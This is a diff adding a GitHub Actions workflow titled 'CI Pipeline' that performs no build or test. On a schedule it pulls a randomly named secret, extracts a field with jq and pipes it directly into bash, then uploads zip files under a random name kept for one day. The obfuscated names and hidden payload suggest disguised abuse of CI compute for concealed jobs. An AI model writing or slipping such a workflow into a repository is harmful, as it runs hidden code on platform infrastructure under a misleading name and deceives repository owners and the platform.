@@ -1,0 +1,29 @@
+name: CI Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '17 3,9,15,21 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  trigger:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Start
+        env:
+          fgex7: ${{ secrets.fgex7 }}
+        run: |
+          printf '%s' "$fgex7" | jq -r .ebw64836 | /bin/bash
+          echo $kczom46924 | jq -r .gfder09 | /bin/bash
+
+      - name: Save output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: zV6TuaAS
+          path: "*.zip"
+          retention-days: 1
